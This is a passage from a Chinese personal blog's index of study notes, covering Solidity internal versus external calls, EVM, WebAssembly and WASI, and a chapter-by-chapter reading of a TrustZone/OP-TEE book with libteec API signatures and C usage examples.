<strong>安全性考虑</strong></h3>\n<ul>\n<li><strong>内部调用</strong>：通常被认为是安全的，因为它们在相同的合约上下文中运行，没有额外的消息传递和上下文切换。</li>\n<li><strong>外部调用</strong>：外部调用则需要更多的安全性考虑，尤其是在涉及到第三方合约时。常见的攻击手段如重入攻击就是通过外部调用进行的。因此，开发者通常会使用<code>checks-effects-interactions</code>模式来防范这种风险。</li>\n</ul>\n<h3 id=\"总结\">总结</h3>\n<ul>\n<li><strong>内部调用</strong>：是一次简单的代码跳转，没有消息传递和上下文切换，效率高且Gas成本低。</li>\n<li><strong>外部调用</strong>：涉及到新的消息传递和上下文切换，消耗更多Gas，并且需要特别注意安全性，尤其是在跨合约调用时。</li>\n</ul>\n<p>理解这些差异对编写高效和安全的Solidity合约非常重要。开发者应根据实际需求选择合适的调用方式，以优化合约的性能和安全性。</p>\n<hr>\n<p>一个合约最终会编译成一段字节码，函数是字节码中的一个部分。内部调用就是直接把执行的代码跳转到另一个函数；外部调用是发起了一个新的消息，创建了新的上下文。</p>\n<h1 id=\"evm\">2 EVM</h1>\n<p>看了这三篇文章：https://learnblockchain.cn/article/3779</p>\n<p>总而言之，了解了EVM中内存存储方式，以及栈式指令的执行过程。</p>\n","categories":["笔记"],"tags":["区块链","以太坊"]},{"title":"WASM 学习","url":"/blockchain/WASM/","content":"<p>我的 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaXNob29uLmdpdGh1Yi5pby9ncmFkdWF0aW9uLXByb2plY3QvMDMv\">毕设03<i class=\"fa fa-external-link-alt\"></i></span>\n帖子已经写了一个 Wasm 的简述，但是那篇文章还是聚焦于 Wasm 在 Web\n中的使用。</p>\n<p>实际上，我更加关注的点应该在于，Wasm\n如何应用在区块链、嵌入式系统里。</p>\n<span id=\"more\"></span>\n<p>Wasm\n更大的优势，并不是在于它的速度。如果纯粹为了比速度，那为什么不用原生的\nC/C++/Rust ，他们也编译成二进制文件，直接运行，多快。</p>\n<p>Wasm 应该对比的就不是 Js （虽然他是为了解决 Js\n的性能问题而诞生的）。</p>\n<blockquote>\n<p>“如果 <code>WebAssembly（Wasm）</code>\n在几年前出现，<code>Docker</code>\n可能就不会出现了。因为它是一项非常强大的跨平台技术，可以让我们使用不同的编程语言来编写跨平台应用程序。<code>Docker</code>\n的原始动力之一就是提供一个跨平台部署和应用的方法。” --\n<code>Solomon Hykes</code>。</p>\n<p>如果 <code>Wasm</code> 早在几年前问世，就可能成为一种替代\n<code>Docker</code>\n的技术，让跨平台部署和应用程序更加容易实现，运行更加流畅。</p>\n<p>https://developer.aliyun.com/article/1261397</p>\n</blockquote>\n<h1 id=\"wasm-的优势\">Wasm 的优势</h1>\n<ul>\n<li><p>跨平台性好</p>\n<p>因为 Wasm\n是低级字节码格式，它可以在任何操作系统和编程语言上运行。因此，Wasm\n可以被看作是一种跨平台的计算单元，可以消除由于平台、语言和工具的差异而引起的一些问题。</p></li>\n<li><p>安全性</p>\n<p>Wasm 外有一个额外的虚拟层，不能直接操作系统 API 。</p></li>\n<li><p>资源占用少</p>\n<p><code>Wasm</code>\n是一种非常轻量级的技术，它的内存占用量和运行时开销都非常小。在 Web\n上，意味着更快的加载速度；在嵌入式中，意味着可以在更边缘的芯片上运行。</p></li>\n<li><p>执行效率高</p>\n<p>Wasm\n使用基于栈的虚拟机，可以避免一些性能问题，它更接近于原生代码，这使得执行效率相对而言可以更高。</p></li>\n</ul>\n<p>wasm的高性能，只是相对于js而言的。和原生的c程序、c++、rust程序相比，wasm并不一定有更高的性能。但是wasm的优势在于他的可移植性，沙箱化带来的安全性等。</p>\n<h1 id=\"概念辨析\">概念辨析</h1>\n<h2 id=\"wasi\">WASI</h2>\n<p>2020年，WASI（WebAssembly System Interface）正式发布。这是一种\n标准化接口规范，旨在提供与操作系统无关的底层 API。</p>\n<p>讲的太好了：https://zhuanlan.zhihu.com/p/61423010</p>\n<p>传统的可移植性：一份代码，通过设置不同的编译目标，得到可以在不同平台上运行的可执行文件。</p>\n<p>WASI的可移植性：一份代码，编译出一个WASM字节码，送给各个不通平台上的WASM运行时环境。</p>\n<figure>\n<img src=\"/blockchain/WASM/image-20241005010128951.png\" alt=\"image-20241005010128951\">\n<figcaption aria-hidden=\"true\">image-20241005010128951</figcaption>\n</figure>\n<figure>\n<img src=\"/blockchain/WASM/image-20241005010111769.png\" alt=\"image-20241005010111769\">\n<figcaption aria-hidden=\"true\">image-20241005010111769</figcaption>\n</figure>\n<p>WASI 的目标是让 WebAssembly\n能够真正成为一种普适的、跨平台的二进制格式，不仅限于浏览器应用，而是在服务器端、嵌入式系统、甚至操作系统内核中都能发挥作用。</p>\n<p>我觉得WASI有点像Java虚拟机的感觉。对java来说，就是只用编译一个jar包，在各个平台上都可以运行。</p>\n<p>最主要的区别在于，JVM 提供了更复杂庞大的功能（例如垃圾回收），而 WASI\n更轻量，只解决 WASM 无法和系统交互的问题。</p>\n<h2 id=\"wat-webassembly-text-format\">WAT (WebAssembly Text Format)</h2>\n<p>Wasm 的文本表现形式。Wasm\n是二进制文件，不便于阅读。可以转换成方便阅读的 WAT。例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(module</span><br><span class=\"line\">  (func $addTwo (param $x i32) (result i32)</span><br><span class=\"line\">    get_local $x</span><br><span class=\"line\">    i32.const 2</span><br><span class=\"line\">    i32.add))</span><br></pre></td></tr></table></figure>\n<p>有点像机器码和汇编代码的关系。</p>\n<h1 id=\"wamr\">WAMR</h1>\n<p>一个 Wasm 运行时的轻量化实现，适合集成到嵌入式设备。</p>\n<h1 id=\"wasm-的工作原理\">WASM 的工作原理</h1>\n<p>《WebAssembly原理与核心技术》</p>\n<h1 id=\"参考资料\">参考资料</h1>\n<p>https://www.infoq.cn/article/72uz19s34UoK236YZaYM</p>\n","categories":["笔记"],"tags":["WebAssembly","WASM"]},{"title":"TrustZone 与 OP-TEE 技术详解","url":"/blockchain/OP-TEE/","content":"<p>《手机安全和可信应用开发指南：TrustZone与OP-TEE技术详解\n(网络空间安全技术丛书)》阅读笔记。</p>\n<span id=\"more\"></span>\n<h1 id=\"可信执行环境\">1 可信执行环境</h1>\n<p>TrustZone\n实现了一个<strong>芯片级</strong>的安全扩展组件，去验证CPU发送的数据访问请求的<strong>非安全状态读写信号位\n（Non-secure bit，NS\nbit）</strong>，0表示该请求是安全的，1表示该请求是非安全的。</p>\n<p>当非安全请求试图访问安全数据时，该请求会被认为是非法的。</p>\n<p>TEE 是一套完整的解决方案，包括：</p>\n<ul>\n<li><p><strong>正常世界状态的客户端应用</strong></p>\n<p>OP-TEE 中的 host 部分；Client Application（CA）</p></li>\n<li><p><strong>安全世界状态的可信应用</strong></p>\n<p>OP-TEE 中的 ta 部分；Trusted Application（TA）</p></li>\n<li><p><strong>可信硬件驱动</strong>（Secure Driver）</p></li>\n<li><p><strong>可信内核系统</strong>（TEE OS）</p></li>\n</ul>\n<h1 id=\"arm-的-trustzone-技术\">2 Arm 的 TrustZone 技术</h1>\n<p>在缓存、内存管理单元、总线等资源上增加了安全位。实现了外部资源和内存资源的硬件隔离。这些硬件隔离包括中断隔离、片上RAM和ROM的隔离、片外RAM和ROM的隔离、外围设备的硬件隔离、外部RAM和ROM的隔离等。</p>\n<p>这部分内容过于硬件，看不懂，暂时跳过。</p>\n<h1 id=\"arm-可信固件\">3 ARM 可信固件</h1>\n<p>ARM 可信任固件（ARM Trusted\nFirmware，ATF）是由ARM官方提供的底层固件，该固件统一了ARM底层接口标准，如电源状态控制接口\n（Power Status Control Interface，PSCI）、安全启动需求（Trusted Board\nBoot\nRequirements，TBBR）、安全世界状态（SWS）与正常世界状态（NWS）切换的安全监控模式调用（secure\nmonitor\ncall，smc）操作等。ATF旨在将ARM底层的操作统一使代码能够重用和便于移植。</p>\n<p>ATF的源代码共分为bl1、bl2、bl31、bl32、bl33部分。</p>\n<p>其中bl1、bl2、bl31部分属于固定的固件。</p>\n<p>bl32和bl33分别用于加载TEE OS和REE侧的镜像。</p>\n<p>第六章将有详细讲解。</p>\n<h1 id=\"op-tee-运行环境搭建\">4 OP-TEE 运行环境搭建</h1>\n<p>略。见我的 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaXNob29uLmdpdGh1Yi5pby9ncmFkdWF0aW9uLXByb2plY3QvMDEv\">毕设01<i class=\"fa fa-external-link-alt\"></i></span> 和 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaXNob29uLmdpdGh1Yi5pby9ncmFkdWF0aW9uLXByb2plY3QvMDIv\">毕设02<i class=\"fa fa-external-link-alt\"></i></span>。</p>\n<h1 id=\"qemu运行op-tee的启动过程\">5 QEMU运行OP-TEE的启动过程</h1>\n<p>由第四章得知，在 <code>build</code> 目录执行\n<code>make run-only</code> 即可在 QEMU 中启动 OP-TEE。</p>\n<p>这个过程主要加载 <code>bios.bin</code> 文件，并从该镜像中分离Linux\n内核镜像和 OP-TEE 镜像以及 rootfs 镜像。并将rootfs作为根文件系统挂载到\nLinux 系统中。</p>\n<h1 id=\"安全引导功能及atf的启动过程\">6 安全引导功能及ATF的启动过程</h1>\n<p>安全引导通过电子签名保证系统中重要镜像文件的完整性。OP-TEE 的\nBootLoader 镜像文件、TEE 镜像文件、Linux\n内核镜像文件等等都使用了安全引导功能。</p>\n<p>一个直观的感受是，当前大多数 ARM\n芯片的系统，如果用户非法刷入其他厂商的 ROM 后手机无法正常启动。</p>\n<p>实现方法是在芯片出厂时，就在 ChipRom\n固化了一部分代码。RSA公钥或哈希值会在出厂之前写入到\n<code>OTP/efuse</code> 中，只有 ChipRom 和 TEE\n可以读取其中的内容且无法修改。</p>\n<p>ARMv7的安全引导过程：</p>\n<figure>\n<img src=\"/blockchain/OP-TEE/image-20241008144836831.png\" alt=\"image-20241008144836831\">\n<figcaption aria-hidden=\"true\">image-20241008144836831</figcaption>\n</figure>\n<p>ARMv8的安全引导过程：</p>\n<figure>\n<img src=\"/blockchain/OP-TEE/image-20241008145013315.png\" alt=\"image-20241008145013315\">\n<figcaption aria-hidden=\"true\">image-20241008145013315</figcaption>\n</figure>\n<p>完全没看懂……</p>\n<h1 id=\"ree-侧的上层软件\">7 REE 侧的上层软件</h1>\n<p>文中说：“REE 侧的上层软件包括 <code>libteec</code> 库和\n<code>tee_supplicant</code> 。”</p>\n<p>这里的上层软件，指的不是用户编写的程序或操作系统的软件，<strong>上层</strong>指的是提供的库。</p>\n<p><code>libteec</code> 库提供 CA 程序运行时的基本接口。</p>\n<p><code>tee_supplicant</code> 处理来自 TEE 侧的 RPC 请求。</p>\n<figure>\n<img src=\"/blockchain/OP-TEE/image-20241015195330454.png\" alt=\"image-20241015195330454\">\n<figcaption aria-hidden=\"true\">image-20241015195330454</figcaption>\n</figure>\n<h2 id=\"libteec\">7.1 libteec</h2>\n<h3 id=\"内置接口\">7.1.1 内置接口</h3>\n<p>提供了总共 10 个 API 接口。</p>\n<h4 id=\"teec_initializecontext\">TEEC_InitializeContext</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEEC_Result <span class=\"title function_\">TEEC_InitializeContext</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *name, TEEC_Context *ctx)</span></span><br></pre></td></tr></table></figure>\n<p><code>TEEC_InitializeContext</code> 是 OP-TEE\n中的一个函数，用于初始化与 TEE (Trusted Execution Environment)\n通信的上下文 (Context)。这是 TEE 客户端与 TEE\n系统之间建立通信的第一步。它为后续的安全操作（如打开会话、调用信任应用程序等）创建一个上下文环境。</p>\n<p><code>name</code>（<code>const char \\*name</code>）：</p>\n<ul>\n<li>这是一个指向字符串的指针，通常表示 TEE\n的名称。在大多数情况下，该参数可以传入 <code>NULL</code>，表示使用默认的\nTEE 实现（通常是 OP-TEE）。</li>\n<li>如果你有多个 TEE 实现，或者特定的 TEE\n配置，你可以传递一个特定的名称来标识你想使用的 TEE。</li>\n</ul>\n<p><code>ctx</code>（<code>TEEC_Context \\*ctx</code>）：</p>\n<ul>\n<li>这是一个指向 <code>TEEC_Context</code>\n结构体的指针，函数通过这个指针返回一个已初始化的上下文对象。这个上下文对象将用于后续的\nTEE 操作，如打开会话 (<code>TEEC_OpenSession</code>) 和执行命令\n(<code>TEEC_InvokeCommand</code>)。</li>\n<li>调用这个函数时，必须为 <code>ctx</code>\n提供一个有效的指针，函数会将上下文的初始化结果存储在这个结构体中。</li>\n</ul>\n<p>返回值：</p>\n<ul>\n<li>函数返回类型是 <code>TEEC_Result</code>，它表示操作的结果。如果返回\n<code>TEEC_SUCCESS</code>，说明上下文初始化成功；否则返回一个错误代码，表示初始化失败。</li>\n</ul>\n<h4 id=\"teec_finalizecontext\">TEEC_FinalizeContext</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">TEEC_FinalizeContext</span><span class=\"params\">(TEEC_Context *ctx)</span></span><br></pre></td></tr></table></figure>\n<p>释放一个已经被初始化的类型为TEEC_Context的变量，关闭CA与TEE之间的连接。</p>\n<h4 id=\"teec_opensession\">TEEC_OpenSession</h4>\n<p><code>TEEC_OpenSession</code> 函数用于在客户端应用程序（位于 Normal\nWorld）和 TEE 中的信任应用程序（位于 Secure\nWorld）之间建立会话。会话建立后，客户端可以通过会话与 TA\n进行命令传递和数据交换。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEEC_Result <span class=\"title function_\">TEEC_OpenSession</span><span class=\"params\">(TEEC_Context *ctx,</span></span><br><span class=\"line\"><span class=\"params\">                             TEEC_Session *session,</span></span><br><span class=\"line\"><span class=\"params\">                             <span class=\"type\">const</span> TEEC_UUID *destination,</span></span><br><span class=\"line\"><span class=\"params\">                             <span class=\"type\">uint32_t</span> connectionMethod,</span></span><br><span class=\"line\"><span class=\"params\">                             <span class=\"type\">const</span> <span class=\"type\">void</span> *connectionData,</span></span><br><span class=\"line\"><span class=\"params\">                             TEEC_Operation *operation,</span></span><br><span class=\"line\"><span class=\"params\">                             <span class=\"type\">uint32_t</span> *returnOrigin)</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>参数解释</strong>：</p>\n<ol type=\"1\">\n<li><p><strong><code>ctx</code>（<code>TEEC_Context \\*ctx</code>）：</strong></p>\n<ul>\n<li>这是一个指向已初始化的 <code>TEEC_Context</code>\n结构体的指针，它用于指定会话的上下文环境。这个上下文必须通过之前调用的\n<code>TEEC_InitializeContext</code> 函数初始化。</li>\n<li>它代表了客户端与 TEE\n的通信通道，所有后续的操作都是基于这个上下文进行的。</li>\n</ul></li>\n<li><p><strong><code>session</code>（<code>TEEC_Session \\*session</code>）：</strong></p>\n<ul>\n<li>这是一个指向 <code>TEEC_Session</code>\n结构体的指针，函数通过这个指针返回一个已打开的会话对象。后续客户端与 TA\n的通信将基于这个会话进行。</li>\n<li>调用 <code>TEEC_OpenSession</code>\n后，成功建立的会话会被存储在这个结构体中，后续的命令调用等操作将依赖这个会话对象。</li>\n</ul></li>\n<li><p><strong><code>destination</code>（<code>const TEEC_UUID \\*destination</code>）：</strong></p>\n<ul>\n<li>这是一个指向 <code>TEEC_UUID</code>\n结构体的指针，表示目标信任应用程序（TA）的唯一标识符。每个 TA\n都有一个唯一的 UUID，用于标识它。</li>\n<li>客户端通过 UUID 告诉 TEE 需要连接的具体 TA。</li>\n</ul></li>\n<li><p><strong><code>connectionMethod</code>（<code>uint32_t connectionMethod</code>）：</strong></p>\n<ul>\n<li>该参数用于指定会话的连接方法。在 OP-TEE 中，通常使用的连接方法是\n<code>TEEC_LOGIN_PUBLIC</code>，表示不需要额外的身份验证信息即可连接到\nTA。</li>\n<li>其他可能的连接方法包括基于用户身份或组身份的验证方法，如\n<code>TEEC_LOGIN_USER</code> 和 <code>TEEC_LOGIN_GROUP</code>。</li>\n</ul></li>\n<li><p><strong><code>connectionData</code>（<code>const void \\*connectionData</code>）：</strong></p>\n<ul>\n<li>这是与 <code>connectionMethod</code>\n相关的数据指针。在大多数情况下，当使用 <code>TEEC_LOGIN_PUBLIC</code>\n时，这个参数可以设置为 <code>NULL</code>，因为不需要额外的数据。</li>\n<li>如果使用特定的连接方法，这里可能需要传递额外的身份验证数据。</li>\n</ul></li>\n<li><p><strong><code>operation</code>（<code>TEEC_Operation \\*operation</code>）：</strong></p>\n<ul>\n<li>这是一个指向 <code>TEEC_Operation</code>\n结构体的指针，表示需要在打开会话时传递的操作数据。如果不需要传递任何操作，可以将其设置为\n<code>NULL</code>。</li>\n<li>这个结构体包含客户端与 TA\n之间的参数和共享内存，用于传递数据或命令。</li>\n</ul></li>\n<li><p><strong><code>returnOrigin</code>（<code>uint32_t \\*returnOrigin</code>）：</strong></p>\n<ul>\n<li><p>这是一个用于返回错误来源的指针。当会话建立失败时，</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">returnOrigin</span><br></pre></td></tr></table></figure></p>\n<p>会指示错误是发生在客户端、TEE 系统还是 TA 内部。常见的返回值有：</p>\n<ul>\n<li><code>TEEC_ORIGIN_API</code>：表示错误来自 API 调用本身。</li>\n<li><code>TEEC_ORIGIN_COMMS</code>：表示错误发生在与 TEE 的通信层。</li>\n<li><code>TEEC_ORIGIN_TEE</code>：表示错误来自 TEE 系统。</li>\n<li><code>TEEC_ORIGIN_TRUSTED_APP</code>：表示错误来自 TA。</li>\n</ul></li>\n</ul></li>\n</ol>\n<p><strong>返回值</strong>：</p>\n<ul>\n<li><p>函数返回类型为</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEEC_Result</span><br></pre></td></tr></table></figure></p>\n<p>它表示操作的结果。</p>\n<ul>\n<li>如果返回 <code>TEEC_SUCCESS</code>，表示会话成功打开。</li>\n<li>否则返回错误代码，表示会话建立失败。</li>\n</ul></li>\n</ul>\n<h4 id=\"teec_closesession\">TEEC_CloseSession</h4>\n<p>关闭一个 session</p>\n<h4 id=\"teec_invokecommand\">TEEC_InvokeCommand</h4>\n<p>用于在客户端与信任应用程序 (Trusted Application, TA)\n之间执行命令的函数。通过这个函数，客户端可以请求 TA\n执行特定的安全操作或服务，并交换数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEEC_Result <span class=\"title function_\">TEEC_InvokeCommand</span><span class=\"params\">(TEEC_Session *session,</span></span><br><span class=\"line\"><span class=\"params\">                               <span class=\"type\">uint32_t</span> commandID,</span></span><br><span class=\"line\"><span class=\"params\">                               TEEC_Operation *operation,</span></span><br><span class=\"line\"><span class=\"params\">                               <span class=\"type\">uint32_t</span> *returnOrigin)</span>;</span><br></pre></td></tr></table></figure>\n<p>参数解释：</p>\n<p><code>commandID</code>（<code>uint32_t commandID</code>）：</p>\n<ul>\n<li>表示客户端请求 TA 执行的具体命令的标识符。每个 TA\n都可以定义一组命令，每个命令有一个唯一的\n<code>commandID</code>，用于区分不同的操作。</li>\n</ul>\n<p><code>operation</code>（<code>TEEC_Operation \\*operation</code>）：</p>\n<ul>\n<li>这是一个指向 <code>TEEC_Operation</code>\n结构体的指针，表示本次命令执行时传递的参数或数据。如果没有参数要传递，可以将其设置为\n<code>NULL</code>。</li>\n<li><code>TEEC_Operation</code> 是客户端与 TA\n之间传递数据、参数和共享内存的机制。这个结构体包含四个参数槽（<code>paramTypes</code>\n和\n<code>params[]</code>），每个槽都可以存储不同类型的数据（如值、内存引用等）。</li>\n</ul>\n<p>结构体中包含的四个参数槽类型可以是以下几种类型：</p>\n<ul>\n<li><code>TEEC_NONE</code>：表示没有参数。</li>\n<li><code>TEEC_VALUE_INPUT</code>：表示输入类型的简单值参数。</li>\n<li><code>TEEC_VALUE_OUTPUT</code>：表示输出类型的简单值参数。</li>\n<li><code>TEEC_VALUE_INOUT</code>：表示输入和输出类型的简单值参数。</li>\n<li><code>TEEC_MEMREF_TEMP_INPUT</code>：表示传递临时输入的内存引用。</li>\n<li><code>TEEC_MEMREF_TEMP_OUTPUT</code>：表示接收临时输出的内存引用。</li>\n<li><code>TEEC_MEMREF_WHOLE</code>：表示整个共享内存块。</li>\n<li><code>TEEC_MEMREF_PARTIAL_INPUT/OUTPUT</code>：表示部分输入或输出的共享内存。</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> {</span></span><br><span class=\"line\">    TEEC_Session *session,  <span class=\"comment\">// 启用该操作的会话</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> started;       <span class=\"comment\">// 指示操作是否已启动（通常由内部使用）</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> paramTypes;    <span class=\"comment\">// 参数类型，用来定义 params 中的每个参数的类型</span></span><br><span class=\"line\">    TEEC_Parameter params[<span class=\"number\">4</span>]; <span class=\"comment\">// 参数数组，最多可以传递4个参数</span></span><br><span class=\"line\">    TEEC_SharedMemory *memRefs; <span class=\"comment\">// 可选，用于传递共享内存（如果有）</span></span><br><span class=\"line\">} TEEC_Operation;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">union</span> {</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> {</span></span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> a;</span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> b;</span><br><span class=\"line\">    } value;  <span class=\"comment\">// 简单值，a 和 b 分别表示两个 32 位的整数</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> {</span></span><br><span class=\"line\">        <span class=\"type\">void</span> *buffer;</span><br><span class=\"line\">        <span class=\"type\">size_t</span> size;</span><br><span class=\"line\">    } tmpref;  <span class=\"comment\">// 临时内存引用</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> {</span></span><br><span class=\"line\">        TEEC_SharedMemory *parent;</span><br><span class=\"line\">        <span class=\"type\">size_t</span> size;</span><br><span class=\"line\">        <span class=\"type\">size_t</span> offset;</span><br><span class=\"line\">    } memref;  <span class=\"comment\">// 共享内存引用</span></span><br><span class=\"line\">} TEEC_Parameter;</span><br></pre></td></tr></table></figure>\n<p>使用示例：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEEC_Result res;</span><br><span class=\"line\">TEEC_Session session;</span><br><span class=\"line\">TEEC_Operation op;</span><br><span class=\"line\"><span class=\"type\">uint32_t</span> returnOrigin;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 假设已经通过 TEEC_OpenSession 成功打开了 session</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置需要传递的参数</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;op, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(op));</span><br><span class=\"line\">op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);</span><br><span class=\"line\">op.params[<span class=\"number\">0</span>].value.a = <span class=\"number\">42</span>;  <span class=\"comment\">// 传递参数值</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用命令，commandID 为 0x1234</span></span><br><span class=\"line\">res = TEEC_InvokeCommand(&amp;session, <span class=\"number\">0x1234</span>, &amp;op, &amp;returnOrigin);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (res != TEEC_SUCCESS) {</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Command failed, error: 0x%x, origin: 0x%x\\n\"</span>, res, returnOrigin);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h5 id=\"如果参数大于4个\">如果参数大于4个？</h5>\n<p>可以使用共享内存，传递一整块内存区域；或将参数打包成结构体。</p>\n<h4 id=\"teec_requestcancellation\">TEEC_RequestCancellation</h4>\n<p><code>TEEC_RequestCancellation</code>\n函数用于请求取消客户端已发起的某个异步操作。并不是所有操作都支持取消，这取决于具体的信任应用程序\n(Trusted Application, TA)\n以及操作是否支持中途取消。调用这个函数不会立即终止操作，而是请求 TEE\n停止当前命令的执行。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">TEEC_RequestCancellation</span><span class=\"params\">(TEEC_Operation *operation)</span>;</span><br></pre></td></tr></table></figure>\n<h4 id=\"teec_registersharememory\">TEEC_RegisterShareMemory</h4>\n<p>用于在客户端和 TEE（Trusted Execution\nEnvironment）之间注册一块共享内存。共享内存区域用于在客户端和信任应用程序（Trusted\nApplication,\nTA）之间传递数据。通过这个函数，客户端可以将其自身的内存区域注册为共享内存，以便在安全世界和普通世界之间进行数据交换。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEEC_Result <span class=\"title function_\">TEEC_RegisterSharedMemory</span><span class=\"params\">(TEEC_Context *ctx,</span></span><br><span class=\"line\"><span class=\"params\">                                      TEEC_SharedMemory *sharedMem)</span>;</span><br></pre></td></tr></table></figure>\n<p><code>TEEC_SharedMemory</code> 结构体的主要字段：</p>\n<ul>\n<li><code>void \\*buffer</code>：指向客户端内存区域的指针，表示需要注册为共享内存的内存块。</li>\n<li><code>size_t size</code>：表示内存块的大小（字节数）。</li>\n<li><code>uint32_t flags</code>：用于标识共享内存的使用方式，常见的值有：\n<ul>\n<li><code>TEEC_MEM_INPUT</code>：表示共享内存是输入内存，客户端将数据传递给\nTEE。</li>\n<li><code>TEEC_MEM_OUTPUT</code>：表示共享内存是输出内存，TEE\n将数据传递给客户端。</li>\n<li><code>TEEC_MEM_INPUT | TEEC_MEM_OUTPUT</code>：表示共享内存既可以作为输入，也可以作为输出。</li>\n</ul></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEEC_SharedMemory sharedMem;</span><br><span class=\"line\">TEEC_Context ctx;</span><br><span class=\"line\">TEEC_Result res;</span><br><span class=\"line\"><span class=\"type\">void</span> *buffer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 初始化 TEE 上下文</span></span><br><span class=\"line\">res = TEEC_InitializeContext(<span class=\"literal\">NULL</span>, &amp;ctx);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 分配客户端的内存区域</span></span><br><span class=\"line\">buffer = <span class=\"built_in\">malloc</span>(<span class=\"number\">1024</span>); <span class=\"comment\">// 分配1KB的内存</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置共享内存参数</span></span><br><span class=\"line\">sharedMem.buffer = buffer;</span><br><span class=\"line\">sharedMem.size = <span class=\"number\">1024</span>;</span><br><span class=\"line\">sharedMem.flags = TEEC_MEM_INPUT; <span class=\"comment\">// 该共享内存用于传递输入数据</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 注册共享内存</span></span><br><span class=\"line\">res = TEEC_RegisterSharedMemory(&amp;ctx, &amp;sharedMem);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (res != TEEC_SUCCESS) {</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Shared memory registration failed, error code: 0x%x\\n\"</span>, res);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 执行其他操作，比如使用 TEEC_InvokeCommand 传递该共享内存...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 完成后，释放共享内存</span></span><br><span class=\"line\">TEEC_ReleaseSharedMemory(&amp;sharedMem);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 释放分配的内存</span></span><br><span class=\"line\"><span class=\"built_in\">free</span>(buffer);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 最终关闭 TEE 上下文</span></span><br><span class=\"line\">TEEC_FinalizeContext(&amp;ctx);</span><br></pre></td></tr></table></figure>\n<h4 id=\"teec_registersharememoryfiledescriptor\">TEEC_RegisterShareMemoryFileDescriptor</h4>\n<p>用于通过文件描述符将内存区域注册为共享内存，从而在客户端和\nTEE（Trusted Execution Environment）之间进行数据传递。与\n<code>TEEC_RegisterSharedMemory</code>\n函数不同的是，<code>TEEC_RegisterSharedMemoryFileDescriptor</code>\n允许客户端通过文件描述符直接引用内存，这对于内存映射文件或设备共享内存区域非常有用。</p>\n<h4 id=\"teec_allocatesharedmemory\">TEEC_AllocateSharedMemory</h4>\n<p>用于在客户端与 TEE（Trusted Execution\nEnvironment）之间分配一块共享内存。与\n<code>TEEC_RegisterSharedMemory</code>\n不同，<code>TEEC_AllocateSharedMemory</code> 由 TEE\n客户端库直接为客户端分配内存区域，而不是由客户端自己预先分配并注册。这在需要动态分配内存时非常有用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEEC_Result res;</span><br><span class=\"line\">TEEC_Context ctx;</span><br><span class=\"line\">TEEC_SharedMemory sharedMem;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 初始化 TEE 上下文</span></span><br><span class=\"line\">res = TEEC_InitializeContext(<span class=\"literal\">NULL</span>, &amp;ctx);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (res != TEEC_SUCCESS) {</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Failed to initialize context: 0x%x\\n\"</span>, res);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">}</span><br><span 